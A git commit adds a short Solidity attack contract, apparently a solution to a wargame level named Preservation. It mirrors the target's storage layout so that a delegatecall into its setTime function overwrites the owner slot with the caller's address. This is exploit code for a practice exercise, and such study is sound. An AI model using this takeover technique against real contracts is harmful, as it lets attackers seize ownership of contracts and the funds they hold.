5bcdbe6835dc74a2d63b68476b6ee8659178b21b
Charlie Benson <34482986+CharlieJRBenson@users.noreply.github.com>
2023-02-28 15:58:30 +0000

    hack contract

---
+++ Preservation/PreservationHack.sol
@@ -0,0 +1,16 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Preservation {
+
+  // public library contracts 
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+ 
+  function setTime(uint _time) public {
+    owner = msg.sender;
+  }
+}
+
